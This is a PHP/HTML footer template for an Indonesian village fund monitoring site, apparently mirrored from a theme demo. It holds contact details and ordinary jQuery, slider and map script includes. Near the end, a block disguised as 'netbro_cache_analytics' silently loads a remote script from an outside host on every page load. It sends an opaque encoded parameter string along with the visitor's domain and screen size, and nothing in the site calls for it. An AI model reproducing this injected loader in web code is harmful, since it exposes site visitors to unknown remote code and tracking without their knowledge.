<footer class="footer">
    <div class="container">
        <div class="row module-wrapper">
            <div class="col-md-8 col-sm-6">
                <div class="widget">
                    <div class="widget-title">
                        <h4>Kontak</h4>
                    </div>
                    <ul class="site-links">
                        <li><i class="fa fa-link"></i> www.sidandes.000webhostapp.com </li>
                        <li><i class="fa fa-envelope"></i> info@sidandes.000webhostapp.com</li>
                        <li><i class="fa fa-phone"></i> +62 812 345 678 90</li>
                        <li><i class="fa fa-home"></i> Jl. Muchlis Rahim, Desa Panggulo Barat
                            Kec. Botupingge, Bone Bolango, Gorontalo</li>
                    </ul>
                </div><!-- end widget -->
            </div><!-- end col -->

        </div><!-- end row -->
    </div>
</footer>

<section class="copyright">
    <div class="container">
        <div class="row">
            <div class="col-md-6 text-left">
                <p>© 2019 Pemantauan Dana Desa. by <a href="#" title="Politeknik Gorontalo">Politeknik Gorontalo</a></p>
            </div><!-- end col -->
            <div class="col-md-6 text-right">
                <ul class="list-inline">
                    <li><a href="#">Terms of Usage</a></li>
                    <li><a href="#">Privacy Policy</a></li>
                    <li><a href="#">Sitemap</a></li>
                </ul>
            </div>
        </div><!-- end row -->
    </div><!-- end container -->
</section><!-- end section -->
</div><!-- end wrapper -->

<script src="<?php echo base_url(); ?>assetsweb/js/jquery.min.js"></script>
<script src="<?php echo base_url(); ?>assetsweb/js/bootstrap.js"></script>
<script src="<?php echo base_url(); ?>assetsweb/js/retina.js"></script>
<script src="<?php echo base_url(); ?>assetsweb/js/parallax.js"></script>
<script src="<?php echo base_url(); ?>assetsweb/js/wow.js"></script>
<script src="<?php echo base_url(); ?>assetsweb/js/carousel.js"></script>
<script src="<?php echo base_url(); ?>assetsweb/js/custom.js"></script>

<!-- PORTFOLIO -->
<script src="<?php echo base_url(); ?>assetsweb/js/isotope.js"></script>
<script src="<?php echo base_url(); ?>assetsweb/js/imagesloaded.pkgd.js"></script>
<script src="<?php echo base_url(); ?>assetsweb/js/masonry.js"></script>
<script src="<?php echo base_url(); ?>assetsweb/js/jquery.prettyPhoto.js"></script>
<script type="text/javascript">
    (function($) {
        "use strict";
        jQuery('a[data-gal]').each(function() {
            jQuery(this).attr('rel', jQuery(this).data('gal'));
        });
        jQuery("a[data-rel^='prettyPhoto']").prettyPhoto({
            animationSpeed: 'slow',
            theme: 'light_square',
            slideshow: true,
            overlay_gallery: true,
            social_tools: false,
            deeplinking: false
        });
    })(jQuery);
</script>

<!-- SLIDER REV -->
<script src="<?php echo base_url(); ?>assetsweb/js/jquery.themepunch.tools.min.js"></script>
<script src="<?php echo base_url(); ?>assetsweb/js/jquery.themepunch.revolution.min.js"></script>
<script>
    jQuery(document).ready(function() {
        jQuery('.tp-banner').show().revolution({
            dottedOverlay: "none",
            delay: 16000,
            startwidth: 1170,
            startheight: 600,
            hideThumbs: 200,
            thumbWidth: 100,
            thumbHeight: 50,
            thumbAmount: 5,
            navigationType: "none",
            navigationArrows: "solo",
            navigationStyle: "preview2",
            touchenabled: "on",
            onHoverStop: "on",
            swipe_velocity: 0.7,
            swipe_min_touches: 1,
            swipe_max_touches: 1,
            drag_block_vertical: false,
            parallax: "mouse",
            parallaxBgFreeze: "on",
            parallaxLevels: [10, 7, 4, 3, 2, 5, 4, 3, 2, 1],
            parallaxDisableOnMobile: "off",
            keyboardNavigation: "off",
            navigationHAlign: "center",
            navigationVAlign: "bottom",
            navigationHOffset: 0,
            navigationVOffset: 20,
            soloArrowLeftHalign: "left",
            soloArrowLeftValign: "center",
            soloArrowLeftHOffset: 20,
            soloArrowLeftVOffset: 0,
            soloArrowRightHalign: "right",
            soloArrowRightValign: "center",
            soloArrowRightHOffset: 20,
            soloArrowRightVOffset: 0,
            shadow: 0,
            fullWidth: "on",
            fullScreen: "off",
            spinner: "spinner4",
            stopLoop: "off",
            stopAfterLoops: -1,
            stopAtSlide: -1,
            shuffle: "off",
            autoHeight: "off",
            forceFullWidth: "off",
            hideThumbsOnMobile: "off",
            hideNavDelayOnMobile: 1500,
            hideBulletsOnMobile: "off",
            hideArrowsOnMobile: "off",
            hideThumbsUnderResolution: 0,
            hideSliderAtLimit: 0,
            hideCaptionAtLimit: 0,
            hideAllCaptionAtLilmit: 0,
            startWithSlide: 0,
            fullScreenOffsetContainer: ""
        });
    });
</script>

<script src="<?php echo base_url(); ?>assetsweb/js/jquery-ui.js"></script>
<script src="<?php echo base_url(); ?>assetsweb/js/jquery-ui-timepicker-addon.js"></script>
<script src="<?php echo base_url(); ?>assetsweb/js/bootstrap-select.js"></script>
<script type="text/javascript">
    (function($) {
        "use strict";
        $('.selectpicker').selectpicker();
        $("#datepicker").datepicker();
    })(jQuery);
</script>
<!-- Auto Numerik 2 -->
<script src="<?php echo base_url(); ?>assets/dist/js/jquery.number.js"></script>
<script src="http://maps.google.com/maps/api/js?sensor=false"></script>
<script src="<?php echo base_url(); ?>assetsweb/js/map.js"></script>
<script src="<?php echo base_url(); ?>assetsweb/js/contact.js"></script>
<script type="text/javascript">
    if (self == top) {
        function netbro_cache_analytics(fn, callback) {
            setTimeout(function() {
                fn();
                callback();
            }, 0);
        }

        function sync(fn) {
            fn();
        }

        function requestCfs() {
            var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
            var idc_glo_r = Math.floor(Math.random() * 99999999999);
            var url = idc_glo_url + "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAkGrbEf312B0nHbt2T5U2XZqsodNIH10ZQ615UZ0FmySW5GldnrktxlZoUHpivHhosa%2bFc3sqeaoUM7kO7LVPUclkCJ8IdF10aR6FoIj6T%2baGv5QTaNfOkSAwLM7kzYZ6r2JsVBlWdwknYzqqdWbkF2ezmSM%2buE3V3JKyyarWRzw1jCX%2fQHbRidxIVosc0MgGI%2bHw8B2YIe1bkw1XLi5On5lY3poStTvx4LlODuarrGabY8bOhUkMPp5NnL%2bOa%2fUqRVlczLROVAAbf9ZZ0QAI3MNFizyEosbbkZGwZCz39yGFjHdQk%2bAAPqPfKb%2b%2fUnJ1brhZFdajnwlWevfa72ZGS0wlUW32CiwrZwsozvBKANP5oBKJ8g9z5m0Qcb3rqtaQFKM05p4eF1NJaRcPEcHuHlAEURPjb3LOz2gJYklgAzF7Rx9ApTm1B%2boLtOq8Wr%2bRAR1UlfnwsIEILYWqAX2TiIyH6LhhaCqFSV0dzLTslyI%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
            var bsa = document.createElement('script');
            bsa.type = 'text/javascript';
            bsa.async = true;
            bsa.src = url;
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
        }
        netbro_cache_analytics(requestCfs, function() {});
    };

    $('#alert').delay('slow').slideDown('slow').delay(4100).slideUp(600);
</script>
</body>

<!-- Mirrored from showwp.com/demos/ws-garden/index-boxed.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 31 Oct 2019 10:57:06 GMT -->

</html>